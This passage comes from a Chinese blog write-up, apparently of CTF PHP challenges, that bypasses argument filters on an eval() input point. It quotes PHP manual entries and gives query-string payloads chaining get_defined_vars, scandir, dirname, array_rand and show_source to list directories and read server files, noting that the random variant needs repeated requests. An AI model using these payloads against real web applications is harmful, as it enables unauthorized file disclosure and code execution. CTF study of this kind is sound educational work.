HTTP 请求头信息</p>\n<p>说明 ¶<br/> getallheaders(): array<br/> 获取当前请求的所有请求头信息。</p>\n<h5><a id=\"end_706\"></a>end</h5>\n<p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>\n<p>end — 将数组的内部指针指向最后一个单元</p>\n<p>说明 ¶<br/> end(array|object &amp;$array): mixed<br/> end() 将 array 的内部指针移动到最后一个单元并返回其值</p>\n<h5><a id=\"array_reverse_715\"></a>array_reverse</h5>\n<p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>\n<p>array_reverse — 返回单元顺序相反的数组</p>\n<p>说明 ¶<br/> array_reverse(array $array, bool $preserve_keys = false): array<br/> array_reverse() 接受数组 array 作为输入并返回一个单元为相反顺序的新数组。</p>\n<p>一套combo我们可以取出请求头中最后一位</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\79843541458e40858c8665d4bea05f11.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\813dc3abaa4842fa8dde6f3050208c07.png\"/></p>\n<h3><a id=\"3_get_defined_vars_729\"></a>3. get_defined_vars()</h3>\n<h5><a id=\"get_defined_vars_730\"></a>get_defined_vars</h5>\n<p>(PHP 4 &gt;= 4.0.4, PHP 5, PHP 7, PHP 8)</p>\n<p>get_defined_vars — 返回由所有已定义变量所组成的数组</p>\n<p>描述 ¶<br/> get_defined_vars(): array<br/> 此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br/> 先get_defined_vars()得到四个数组get -&gt; post -&gt; cookie -&gt; files<br/> current定位第一个get<br/> code之后再定义一个参数前面套个end就能拿到我们自定义的<br/> <img alt=\"在这里插入图片描述\" src=\"image\\997f67aa8111469b8f0137696db98de5.png\"/></p>\n<pre><code class=\"prism language-bash\">/?code<span class=\"token operator\">=</span>var_dump<span class=\"token punctuation\">(</span>end<span class=\"token punctuation\">(</span>current<span class=\"token punctuation\">(</span>get_defined_vars<span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">b</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\84d84e2d61784f068fd95762514a38ed.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\fa6f3d4caada41c29c12eca9f6f7ba8c.png\"/></p>\n<h3><a id=\"4scandircurrentlocaleconv_748\"></a>4.scandir(current(localeconv()))</h3>\n<p>写过</p>\n<blockquote>\n<p>https://blog.csdn.net/weixin_45751765/article/details/121529484?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164986759116780271987419%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164986759116780271987419&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>blog</sub>first_rank_ecpm_v1~rank_v31_ecpm-6-121529484.nonecase&amp;utm_term=current&amp;spm=1018.2226.3001.4450</p>\n</blockquote>\n<h3><a id=\"5_dirname_753\"></a>5. dirname</h3>\n<p><strong>php特性：对目录取目录得上级目录！</strong></p>\n<h5><a id=\"dirname_755\"></a>dirname</h5>\n<p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>\n<p>dirname — 返回路径中的目录部分</p>\n<p>说明 ¶<br/> dirname(string $path, int $levels = 1): string<br/> 给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名，且目录深度为 levels 级。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\c1bf176cd0814e25a395fbbe119c372e.png\"/></p>\n<pre><code class=\"prism language-bash\">/?code<span class=\"token operator\">=</span>print_r<span class=\"token punctuation\">(</span>scandir<span class=\"token punctuation\">(</span>dirname<span class=\"token punctuation\">(</span>dirname<span class=\"token punctuation\">(</span>dirname<span class=\"token punctuation\">(</span>dirname<span class=\"token punctuation\">(</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>套娃<br/> <img alt=\"在这里插入图片描述\" src=\"image\\fa7c8c6609054502827f7cfa2dc5292d.png\"/><br/> show_source和readfile特性<br/> <img alt=\"在这里插入图片描述\" src=\"image\\2ca24287af3247128812d5651611ac04.png\"/></p>\n<h5><a id=\"array_flip_773\"></a>array_flip</h5>\n<p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>\n<p>array_flip — 交换数组中的键和值</p>\n<p>说明 ¶<br/> array_flip(array $array): array<br/> array_flip() 返回一个反转后的 array，例如 array 中的键名变成了值，而 array 中的值成了键名。</p>\n<h5><a id=\"array_rand_782\"></a>array_rand</h5>\n<p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>\n<p>array_rand — 从数组中随机取出一个或多个随机键</p>\n<p>说明 ¶<br/> array_rand(array $array, int $num = 1): int|string|array<br/> 从数组中取出一个或多个随机的单元，并返回随机条目对应的键（一个或多个）。 它使用了伪随机数产生算法，所以不适合密码学场景。</p>\n<p>参数 ¶<br/> array<br/> 输入的数组。</p>\n<p>num<br/> 指定要取出的单元数量。</p>\n<p>返回值 ¶<br/> 如果只取出一个，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。 如果返回的是包含随机键名的数组，数组单元的顺序按照键名在原数组中的顺序排列。 取出数量如果超过 array 的长度，就会导致 E_WARNING 错误，并返回 NULL。</p>\n<h5><a id=\"str_split_801\"></a>str_split</h5>\n<p>(PHP 5, PHP 7, PHP 8)</p>\n<p>str_split — 将字符串转换为数组</p>\n<p>说明 ¶<br/> str_split(string $string, int $split_length = 1): array<br/> 将一个字符串转换为数组。</p>\n<p>参数 ¶<br/> string<br/> 输入字符串。</p>\n<p>split_length<br/> 每一段的长度。</p>\n<h5><a id=\"set_include_path_817\"></a>set_include_path</h5>\n<p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p>\n<p>set_include_path — 设置 include_path 配置选项</p>\n<p>说明 ¶<br/> set_include_path(string $new_include_path): string<br/> 为当前脚本设置 include_path 运行时的配置选项。<br/> 返回值 ¶<br/> 成功时返回旧的 include_path 或者在失败时返回 false。</p>\n<p>此题中旧的include_path为 .:/usr/local/lib/php<br/> 存在我们所需要的字符串 /<br/> 又能让show_source可以读取include_path下的文件<br/> 一举两得</p>\n<p>拆分一下看起来更易懂<br/> set_include_path返回 .:/usr/local/lib/php</p>\n<blockquote>\n<p>?code=show_source(array_rand(array_flip(scandir(array_rand(x));<br/> x=array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd()))))))</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\fbf6e4e35dbb4a50b527bde3e7529804.png\"/><br/> 运气就rand到了 字符串 /</p>\n<pre><code class=\"prism language-php\">php <span class=\"token operator\">&gt;</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_split</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.:/usr/local/lib/php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nXdebug<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>Step Debug<span class=\"token punctuation\">]</span> Time<span class=\"token operator\">-</span>out connecting to debugging client<span class=\"token punctuation\">,</span> <span class=\"token argument-name\">waited</span><span class=\"token punctuation\">:</span> <span class=\"token number\">200</span> ms<span class=\"token operator\">.</span> Tried<span class=\"token punctuation\">:</span> localhost<span class=\"token punctuation\">:</span><span class=\"token number\">9000</span> <span class=\"token punctuation\">(</span>through xdebug<span class=\"token operator\">.</span>client_host<span class=\"token operator\">/</span>xdebug<span class=\"token operator\">.</span>client_port<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token punctuation\">(</span>\n<span class=\"token operator\">/</span>\n</code></pre>\n<p>然后同样的套路 show_source随机读<br/> 这种利用方法需要持续发包碰运气撞出来</p>\n<h1><a id=\"0x02_rethink_849\"></a>0x02 rethink</h1>\n<p>本来想801-806放在一起的… 但好像太冗长了 还是拆开来吧</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}